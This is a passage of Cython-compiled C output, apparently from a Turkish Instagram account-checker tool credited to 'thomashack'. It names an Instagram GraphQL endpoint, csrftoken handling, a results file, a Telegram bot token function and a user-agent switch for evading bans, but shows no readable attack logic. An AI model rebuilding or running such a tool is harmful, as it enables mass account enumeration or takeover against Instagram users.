  __Pyx_GIVEREF(__pyx_tuple__30);

  
  __pyx_tuple__31 = PyTuple_Pack(1, __pyx_kp_u_https_www_instagram_com_graphql); if (unlikely(!__pyx_tuple__31)) __PYX_ERR(0, 737, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__31);
  __Pyx_GIVEREF(__pyx_tuple__31);

  
  __pyx_tuple__32 = PyTuple_Pack(2, __pyx_kp_u_thomas_txt, __pyx_n_u_a); if (unlikely(!__pyx_tuple__32)) __PYX_ERR(0, 743, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__32);
  __Pyx_GIVEREF(__pyx_tuple__32);

  
  __pyx_tuple__34 = PyTuple_Pack(1, __pyx_kp_u_1_31m_P_BAN_YEDN_UAK_MODU_YAP); if (unlikely(!__pyx_tuple__34)) __PYX_ERR(0, 746, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__34);
  __Pyx_GIVEREF(__pyx_tuple__34);

  
  __pyx_tuple__35 = PyTuple_Pack(1, __pyx_kp_u_38_5_117m1_38_5_231m_Listeyi_Ol); if (unlikely(!__pyx_tuple__35)) __PYX_ERR(0, 758, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__35);
  __Pyx_GIVEREF(__pyx_tuple__35);

  
  __pyx_tuple__36 = PyTuple_Pack(1, __pyx_kp_u_1_39m_Seciminiz); if (unlikely(!__pyx_tuple__36)) __PYX_ERR(0, 766, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__36);
  __Pyx_GIVEREF(__pyx_tuple__36);

  
  __pyx_tuple__37 = PyTuple_Pack(1, __pyx_kp_u_pip_install_requests); if (unlikely(!__pyx_tuple__37)) __PYX_ERR(0, 71, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__37);
  __Pyx_GIVEREF(__pyx_tuple__37);

  
  __pyx_tuple__38 = PyTuple_Pack(1, __pyx_kp_u_pip_install_colorama); if (unlikely(!__pyx_tuple__38)) __PYX_ERR(0, 72, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__38);
  __Pyx_GIVEREF(__pyx_tuple__38);

  
  __pyx_tuple__39 = PyTuple_Pack(1, __pyx_kp_u_pip_install_prettytable); if (unlikely(!__pyx_tuple__39)) __PYX_ERR(0, 73, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__39);
  __Pyx_GIVEREF(__pyx_tuple__39);

  
  __pyx_tuple__40 = PyTuple_Pack(1, __pyx_kp_u_pip_install_webbrowser); if (unlikely(!__pyx_tuple__40)) __PYX_ERR(0, 74, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__40);
  __Pyx_GIVEREF(__pyx_tuple__40);

  
  __pyx_tuple__41 = PyTuple_Pack(1, __pyx_kp_u_pip_install_python_cfonts); if (unlikely(!__pyx_tuple__41)) __PYX_ERR(0, 75, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__41);
  __Pyx_GIVEREF(__pyx_tuple__41);

  
  __pyx_tuple__42 = PyTuple_Pack(1, __pyx_kp_u_pip_install_Faker); if (unlikely(!__pyx_tuple__42)) __PYX_ERR(0, 76, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__42);
  __Pyx_GIVEREF(__pyx_tuple__42);

  
  __pyx_tuple__43 = PyTuple_Pack(1, __pyx_kp_u_pip_install_AegosPy); if (unlikely(!__pyx_tuple__43)) __PYX_ERR(0, 77, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__43);
  __Pyx_GIVEREF(__pyx_tuple__43);

  
  __pyx_tuple__44 = PyTuple_Pack(1, __pyx_kp_u_pip_install_threading); if (unlikely(!__pyx_tuple__44)) __PYX_ERR(0, 78, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__44);
  __Pyx_GIVEREF(__pyx_tuple__44);

  
  __pyx_tuple__45 = PyTuple_Pack(1, __pyx_kp_u_pip_install_GetInfoInsta); if (unlikely(!__pyx_tuple__45)) __PYX_ERR(0, 79, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__45);
  __Pyx_GIVEREF(__pyx_tuple__45);

  
  __pyx_tuple__46 = PyTuple_Pack(1, __pyx_n_u_clear); if (unlikely(!__pyx_tuple__46)) __PYX_ERR(0, 80, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__46);
  __Pyx_GIVEREF(__pyx_tuple__46);

  
  __pyx_tuple__47 = PyTuple_Pack(1, __pyx_kp_u_https_t_me_thomashack); if (unlikely(!__pyx_tuple__47)) __PYX_ERR(0, 102, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__47);
  __Pyx_GIVEREF(__pyx_tuple__47);

  
  __pyx_tuple__49 = PyTuple_Pack(1, __pyx_kp_u_pip_install_uuid); if (unlikely(!__pyx_tuple__49)) __PYX_ERR(0, 191, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__49);
  __Pyx_GIVEREF(__pyx_tuple__49);

  
  __pyx_tuple__50 = PyTuple_Pack(1, __pyx_kp_u_pip_install_mechanize); if (unlikely(!__pyx_tuple__50)) __PYX_ERR(0, 192, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__50);
  __Pyx_GIVEREF(__pyx_tuple__50);

  
  __pyx_tuple__51 = PyTuple_Pack(1, __pyx_kp_u_pip_install_user_agent); if (unlikely(!__pyx_tuple__51)) __PYX_ERR(0, 193, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__51);
  __Pyx_GIVEREF(__pyx_tuple__51);

  
  __pyx_tuple__52 = PyTuple_Pack(1, __pyx_kp_u_pip_install_json); if (unlikely(!__pyx_tuple__52)) __PYX_ERR(0, 194, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__52);
  __Pyx_GIVEREF(__pyx_tuple__52);

  
  __pyx_tuple__53 = PyTuple_Pack(1, __pyx_kp_u_pip_install_faker); if (unlikely(!__pyx_tuple__53)) __PYX_ERR(0, 196, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__53);
  __Pyx_GIVEREF(__pyx_tuple__53);

  
  __pyx_tuple__54 = PyTuple_Pack(1, __pyx_kp_u_Tek_Gercek_Thomas); if (unlikely(!__pyx_tuple__54)) __PYX_ERR(0, 197, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__54);
  __Pyx_GIVEREF(__pyx_tuple__54);

  
  __pyx_tuple__55 = PyTuple_Pack(1, __pyx_n_u_THOMAS); if (unlikely(!__pyx_tuple__55)) __PYX_ERR(0, 346, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__55);
  __Pyx_GIVEREF(__pyx_tuple__55);

  
  __pyx_tuple__56 = PyTuple_Pack(1, __pyx_kp_u_Programmer_T5OMAS_Channel_THOMA); if (unlikely(!__pyx_tuple__56)) __PYX_ERR(0, 348, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__56);
  __Pyx_GIVEREF(__pyx_tuple__56);

  
  __pyx_tuple__57 = PyTuple_Pack(1, __pyx_int_8); if (unlikely(!__pyx_tuple__57)) __PYX_ERR(0, 350, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__57);
  __Pyx_GIVEREF(__pyx_tuple__57);

  
  __pyx_tuple__58 = PyTuple_Pack(2, __pyx_n_s_a, __pyx_n_s_b); if (unlikely(!__pyx_tuple__58)) __PYX_ERR(0, 356, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__58);
  __Pyx_GIVEREF(__pyx_tuple__58);
  __pyx_codeobj__59 = (PyObject*)__Pyx_PyCode_New(0, 0, 2, 0, CO_OPTIMIZED|CO_NEWLOCALS|CO_VARARGS|CO_VARKEYWORDS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__58, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_sg, 356, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__59)) __PYX_ERR(0, 356, __pyx_L1_error)

  
  __pyx_codeobj__60 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_red, 362, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__60)) __PYX_ERR(0, 362, __pyx_L1_error)

  
  __pyx_codeobj__61 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_grn, 365, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__61)) __PYX_ERR(0, 365, __pyx_L1_error)

  
  __pyx_codeobj__62 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_yalo, 368, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__62)) __PYX_ERR(0, 368, __pyx_L1_error)

  
  __pyx_codeobj__63 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_blo, 371, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__63)) __PYX_ERR(0, 371, __pyx_L1_error)

  
  __pyx_codeobj__64 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_orde, 374, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__64)) __PYX_ERR(0, 374, __pyx_L1_error)

  
  __pyx_codeobj__65 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_blodk, 377, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__65)) __PYX_ERR(0, 377, __pyx_L1_error)

  
  __pyx_codeobj__66 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_A, 380, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__66)) __PYX_ERR(0, 380, __pyx_L1_error)

  
  __pyx_codeobj__67 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_brt, 383, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__67)) __PYX_ERR(0, 383, __pyx_L1_error)

  
  __pyx_tuple__68 = PyTuple_Pack(1, __pyx_n_s_self); if (unlikely(!__pyx_tuple__68)) __PYX_ERR(0, 388, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__68);
  __Pyx_GIVEREF(__pyx_tuple__68);
  __pyx_codeobj__69 = (PyObject*)__Pyx_PyCode_New(1, 0, 1, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__68, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_init, 388, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__69)) __PYX_ERR(0, 388, __pyx_L1_error)

  
  __pyx_tuple__70 = PyTuple_Pack(6, __pyx_n_s_self, __pyx_n_s_filename, __pyx_n_s_user_file, __pyx_n_s_lines, __pyx_n_s_executor, __pyx_n_s_use); if (unlikely(!__pyx_tuple__70)) __PYX_ERR(0, 404, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__70);
  __Pyx_GIVEREF(__pyx_tuple__70);
  __pyx_codeobj__71 = (PyObject*)__Pyx_PyCode_New(1, 0, 6, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__70, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_chkfile, 404, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__71)) __PYX_ERR(0, 404, __pyx_L1_error)

  
  __pyx_tuple__72 = PyTuple_Pack(2, __pyx_n_s_self, __pyx_n_s_text); if (unlikely(!__pyx_tuple__72)) __PYX_ERR(0, 420, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__72);
  __Pyx_GIVEREF(__pyx_tuple__72);
  __pyx_codeobj__73 = (PyObject*)__Pyx_PyCode_New(1, 0, 2, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__72, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_tokenbot, 420, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__73)) __PYX_ERR(0, 420, __pyx_L1_error)

  
  __pyx_tuple__74 = PyTuple_Pack(32, __pyx_n_s_self, __pyx_n_s_use, __pyx_n_s_e, __pyx_n_s_dom, __pyx_n_s_domin, __pyx_n_s_user, __pyx_n_s_email, __pyx_n_s_url, __pyx_n_s_heedrs, __pyx_n_s_data, __pyx_n_s_req, __pyx_n_s_cookies, __pyx_n_s_headers, __pyx_n_s_params, __pyx_n_s_rr, __pyx_n_s_name, __pyx_n_s_bio, __pyx_n_s_fol, __pyx_n_s_fols, __pyx_n_s_id, __pyx_n_s_haha, __pyx_n_s_ada, __pyx_n_s_s, __pyx_n_s_rest, __pyx_n_s_re, __pyx_n_s_datet, __pyx_n_s_print, __pyx_n_s_Panel, __pyx_n_s_Console, __pyx_n_s_Text, __pyx_n_s_infoprint, __pyx_n_s_infosand); if (unlikely(!__pyx_tuple__74)) __PYX_ERR(0, 427, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__74);
  __Pyx_GIVEREF(__pyx_tuple__74);
  __pyx_codeobj__75 = (PyObject*)__Pyx_PyCode_New(2, 0, 32, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__74, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_chk, 427, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__75)) __PYX_ERR(0, 427, __pyx_L1_error)

  
  __pyx_tuple__76 = PyTuple_Pack(3, __pyx_n_s_self, __pyx_n_s_text, __pyx_n_s_error); if (unlikely(!__pyx_tuple__76)) __PYX_ERR(0, 668, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__76);
  __Pyx_GIVEREF(__pyx_tuple__76);
  __pyx_codeobj__77 = (PyObject*)__Pyx_PyCode_New(1, 0, 3, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__76, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_idtle, 668, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__77)) __PYX_ERR(0, 668, __pyx_L1_error)

  
  __pyx_tuple__78 = PyTuple_Pack(3, __pyx_n_s_self, __pyx_n_s_req, __pyx_n_s_encoded); if (unlikely(!__pyx_tuple__78)) __PYX_ERR(0, 678, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__78);
  __Pyx_GIVEREF(__pyx_tuple__78);
  __pyx_codeobj__79 = (PyObject*)__Pyx_PyCode_New(1, 0, 3, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__78, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_getcnre, 678, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__79)) __PYX_ERR(0, 678, __pyx_L1_error)

  
  __pyx_codeobj__80 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_dosyasil, 692, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__80)) __PYX_ERR(0, 692, __pyx_L1_error)

  
  __pyx_tuple__81 = PyTuple_Pack(1, __pyx_n_s_id); if (unlikely(!__pyx_tuple__81)) __PYX_ERR(0, 704, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__81);
  __Pyx_GIVEREF(__pyx_tuple__81);
  __pyx_codeobj__82 = (PyObject*)__Pyx_PyCode_New(0, 0, 1, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__81, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_get_id, 704, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__82)) __PYX_ERR(0, 704, __pyx_L1_error)

  
  __pyx_tuple__83 = PyTuple_Pack(8, __pyx_n_s_id, __pyx_n_s_csrftoken, __pyx_n_s_headers, __pyx_n_s_data, __pyx_n_s_response, __pyx_n_s_username, __pyx_n_s_f, __pyx_n_s_e); if (unlikely(!__pyx_tuple__83)) __PYX_ERR(0, 713, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__83);
  __Pyx_GIVEREF(__pyx_tuple__83);
  __pyx_codeobj__84 = (PyObject*)__Pyx_PyCode_New(0, 0, 8, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__83, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_get_username, 713, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__84)) __PYX_ERR(0, 713, __pyx_L1_error)

  
  __pyx_codeobj__85 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_dosyasil, 749, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__85)) __PYX_ERR(0, 749, __pyx_L1_error)

  
  __pyx_tuple__86 = PyTuple_Pack(2, __pyx_n_s_secim, __pyx_n_s_i); if (unlikely(!__pyx_tuple__86)) __PYX_ERR(0, 757, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__86);
  __Pyx_GIVEREF(__pyx_tuple__86);
  __pyx_codeobj__87 = (PyObject*)__Pyx_PyCode_New(0, 0, 2, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__86, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_ana_menu, 757, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__87)) __PYX_ERR(0, 757, __pyx_L1_error)
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_0 = PyInt_FromLong(0); if (unlikely(!__pyx_int_0)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_1 = PyInt_FromLong(1); if (unlikely(!__pyx_int_1)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_2 = PyInt_FromLong(2); if (unlikely(!__pyx_int_2)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_8 = PyInt_FromLong(8); if (unlikely(!__pyx_int_8)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_50 = PyInt_FromLong(50); if (unlikely(!__pyx_int_50)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_60 = PyInt_FromLong(60); if (unlikely(!__pyx_int_60)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_1001 = PyInt_FromLong(1001); if (unlikely(!__pyx_int_1001)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_100118 = PyInt_FromLong(100118L); if (unlikely(!__pyx_int_100118)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_200639 = PyInt_FromLong(200639L); if (unlikely(!__pyx_int_200639)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_1000000 = PyInt_FromLong(1000000L); if (unlikely(!__pyx_int_1000000)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_40975110 = PyInt_FromLong(40975110L); if (unlikely(!__pyx_int_40975110)) __PYX_ERR(0, 5, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/

static int __Pyx_modinit_global_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
  /*--- Global init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
  /*--- Variable export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
  /*--- Function export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
  /*--- Type init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
  /*--- Type import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
  /*--- Variable import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
  /*--- Function import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}


#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC initsource(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC initsource(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_source(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC PyInit_source(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    #if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    } else if (unlikely(main_interpreter_id != current_id))
    #else
    static PyInterpreterState *main_interpreter = NULL;
    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    } else if (unlikely(main_interpreter != current_interpreter))
    #endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {
    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
            result = PyDict_SetItemString(moddict, to_name, value);
        }
        Py_DECREF(value);
    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_source(PyObject *__pyx_pyinit_module)
#endif
#endif
{
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  int __pyx_t_6;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  int __pyx_t_10;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
    PyErr_SetString(PyExc_RuntimeError, "Module 'source' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #elif PY_MAJOR_VERSION >= 3
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif
  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_source(void)", 0);
  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 5, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
